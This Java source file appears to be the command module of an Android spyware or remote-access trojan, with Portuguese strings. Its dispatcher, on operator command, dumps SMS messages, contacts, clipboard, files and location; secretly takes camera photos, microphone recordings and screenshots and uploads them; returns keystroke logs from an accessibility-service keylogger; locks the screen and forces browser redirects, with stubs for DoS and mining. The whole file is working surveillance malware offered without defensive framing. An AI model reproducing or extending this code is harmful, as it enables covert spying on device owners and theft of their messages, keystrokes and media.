package com.kl.logger;

import android.accessibilityservice.AccessibilityService;
import android.content.*;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.location.*;
import android.media.*;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import java.io.*;
import java.util.*;
import java.util.concurrent.*;

public final class Modules {
    private Modules() {}

    public static String run(Context c, String cmd, String arg) throws Exception {
        switch (cmd) {
            case "info":      return Device.info(c, Api.id(c)).toString(2);
            case "sms":       return sms(c);
            case "contacts":  return contacts(c);
            case "apps":      return apps(c);
            case "files":     return files(arg);
            case "clip":      return clip(c);
            case "loc":       return loc(c);
            case "cam":       return cam(c);
            case "mic":       return mic(c);
            case "screen":    return screen(c);
            case "a11ytree":  return a11ytree();
            case "keylog":    return keylog();
            case "lock":      return lock();
            case "toast":     return toast(c, arg);
            case "browser":
            case "redirect":  return browser(c, arg);
            case "dos":       return "stub:dos";
            case "mining":    return "stub:mining";
            case "upd":       return "stub:upd";
            default:          return "cmd desconhecido: " + cmd;
        }
    }

    // ---- SMS --------------------------------------------------------------
    static String sms(Context c) {
        StringBuilder s = new StringBuilder();
        try (Cursor k = c.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[]{"address", "body", "date"}, null, null, "date DESC LIMIT 80")) {
            while (k != null && k.moveToNext()) {
                s.append(k.getString(0)).append(" > ").append(k.getString(1)).append('\n');
            }
        } catch (Exception e) { s.append("sem permissão: ").append(e.getMessage()); }
        return s.length() == 0 ? "(vazio)" : s.toString();
    }

    // ---- Contacts ---------------------------------------------------------
    static String contacts(Context c) {
        StringBuilder s = new StringBuilder();
        try (Cursor k = c.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)) {
            while (k != null && k.moveToNext()) {
                String name = k.getString(k.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String num  = k.getString(k.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                s.append(name).append(" · ").append(num).append('\n');
            }
        } catch (Exception e) { s.append("sem permissão"); }
        return s.length() == 0 ? "(vazio)" : s.toString();
    }

    // ---- Apps -------------------------------------------------------------
    static String apps(Context c) {
        StringBuilder s = new StringBuilder();
        android.content.pm.PackageManager pm = c.getPackageManager();
        for (android.content.pm.ApplicationInfo a : pm.getInstalledApplications(0)) {
            s.append(pm.getApplicationLabel(a)).append(" · ").append(a.packageName).append('\n');
        }
        return s.toString();
    }

    // ---- Files ------------------------------------------------------------
    static String files(String dir) {
        File d = new File(dir == null || dir.isEmpty() ? "/sdcard" : dir);
        StringBuilder s = new StringBuilder();
        File[] ls = d.listFiles();
        if (ls == null) return "vazio ou sem permissão: " + d.getAbsolutePath();
        Arrays.sort(ls, Comparator.comparing(File::getName));
        for (File f : ls) {
            s.append(f.isDirectory() ? "[D] " : "[" + f.length() + "b] ")
             .append(f.getName()).append('\n');
        }
        return s.toString();
    }

    // ---- Clipboard --------------------------------------------------------
    static String clip(Context c) {
        try {
            android.content.ClipboardManager cm =
                    (android.content.ClipboardManager) c.getSystemService(Context.CLIPBOARD_SERVICE);
            if (!cm.hasPrimaryClip()) return "(vazio)";
            android.content.ClipData.Item item = cm.getPrimaryClip().getItemAt(0);
            CharSequence text = item.coerceToText(c);
            return text != null ? text.toString() : "(nulo)";
        } catch (Exception e) { return "(bloqueado em background — Android 10+)"; }
    }

    // ---- Location ---------------------------------------------------------
    static String loc(Context c) throws Exception {
        LocationManager lm = (LocationManager) c.getSystemService(Context.LOCATION_SERVICE);
        Location best = null;
        for (String p : lm.getProviders(true)) {
            try {
                Location l = lm.getLastKnownLocation(p);
                if (l != null && (best == null || l.getTime() > best.getTime())) best = l;
            } catch (SecurityException ignored) {}
        }
        if (best == null) return "sem fix de localização";
        return "https://maps.google.com/?q=" + best.getLatitude() + "," + best.getLongitude()
                + "\nacc=" + best.getAccuracy() + "m  alt=" + best.getAltitude() + "m";
    }

    // ---- Camera (deprecated API, compatível API 26+) ----------------------
    @SuppressWarnings("deprecation")
    static String cam(Context c) throws Exception {
        CountDownLatch latch = new CountDownLatch(1);
        File f = new File(c.getCacheDir(), "cap.jpg");
        final Throwable[] err = {null};

        android.hardware.Camera cam;
        try {
            cam = android.hardware.Camera.open(0);
        } catch (Exception e) {
            return "câmera indisponível: " + e.getMessage();
        }

        try {
            cam.setPreviewTexture(new android.graphics.SurfaceTexture(99));
            cam.startPreview();
            cam.takePicture(null, null, (data, camera) -> {
                try (FileOutputStream o = new FileOutputStream(f)) { o.write(data); }
                catch (IOException e) { err[0] = e; }
                finally { camera.stopPreview(); camera.release(); latch.countDown(); }
            });
        } catch (Exception e) {
            cam.release();
            return "erro câmera: " + e.getMessage();
        }

        latch.await(14, TimeUnit.SECONDS);
        if (err[0] != null) return "erro captura: " + err[0].getMessage();
        if (!f.exists() || f.length() == 0) return "captura vazia";

        byte[] data = readFile(f);
        Api.file(c, "cam.jpg", "image/jpeg", data);
        return "@file cam.jpg (" + data.length + "b)";
    }

    // ---- Mic --------------------------------------------------------------
    static String mic(Context c) throws Exception {
        File f = new File(c.getCacheDir(), "rec.3gp");
        MediaRecorder r = new MediaRecorder();
        r.setAudioSource(MediaRecorder.AudioSource.MIC);
        r.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        r.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        r.setOutputFile(f.getAbsolutePath());
        r.prepare();
        r.start();
        Thread.sleep(10_000);
        r.stop();
        r.release();

        byte[] data = readFile(f);
        Api.file(c, "rec.3gp", "audio/3gpp", data);
        return "@file rec.3gp (" + data.length + "b)";
    }

    // ---- Screen (API 30+) -------------------------------------------------
    static String screen(Context c) throws Exception {
        KeyloggerService svc = KeyloggerService.INSTANCE;
        if (svc == null) return "serviço de acessibilidade off";
        if (Build.VERSION.SDK_INT < 30) return "screenshot requer Android 11+";

        CountDownLatch latch = new CountDownLatch(1);
        File f = new File(c.getCacheDir(), "scr.jpg");
        final Throwable[] err = {null};

        svc.shot(bmp -> {
            if (bmp == null) { err[0] = new Exception("bitmap nulo"); latch.countDown(); return; }
            try (FileOutputStream o = new FileOutputStream(f)) {
                Bitmap sw = bmp.copy(Bitmap.Config.ARGB_8888, false);
                sw.compress(Bitmap.CompressFormat.JPEG, 65, o);
                sw.recycle();
            } catch (IOException e) { err[0] = e; }
            latch.countDown();
        });

        latch.await(14, TimeUnit.SECONDS);
        if (err[0] != null) return "erro screen: " + err[0].getMessage();
        if (!f.exists() || f.length() == 0) return "captura vazia";

        byte[] data = readFile(f);
        Api.file(c, "screen.jpg", "image/jpeg", data);
        return "@file screen.jpg (" + data.length + "b)";
    }

    // ---- A11y tree --------------------------------------------------------
    static String a11ytree() {
        KeyloggerService svc = KeyloggerService.INSTANCE;
        return svc != null ? svc.dumpTree() : "serviço de acessibilidade off";
    }

    // ---- Keylog dump ------------------------------------------------------
    static String keylog() {
        KeyloggerService svc = KeyloggerService.INSTANCE;
        return svc != null ? svc.dumpLog() : "serviço de acessibilidade off";
    }

    // ---- Lock screen (API 28+) --------------------------------------------
    static String lock() {
        KeyloggerService svc = KeyloggerService.INSTANCE;
        if (svc == null) return "serviço de acessibilidade off";
        svc.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
        return "tela travada";
    }

    // ---- Toast / Chat -----------------------------------------------------
    static String toast(Context c, String msg) {
        new Handler(Looper.getMainLooper()).post(() ->
            android.widget.Toast.makeText(c,
                    msg == null || msg.isEmpty() ? "sync" : msg,
                    android.widget.Toast.LENGTH_LONG).show());
        return "exibido";
    }

    // ---- Browser / Redirect -----------------------------------------------
    static String browser(Context c, String url) {
        String target = (url == null || url.isEmpty()) ? "https://google.com" : url;
        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(target));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        c.startActivity(i);
        return "aberto: " + target;
    }

    // ---- helpers ----------------------------------------------------------
    private static byte[] readFile(File f) throws IOException {
        byte[] buf = new byte[(int) f.length()];
        try (FileInputStream in = new FileInputStream(f)) { in.read(buf); }
        return buf;
    }
}
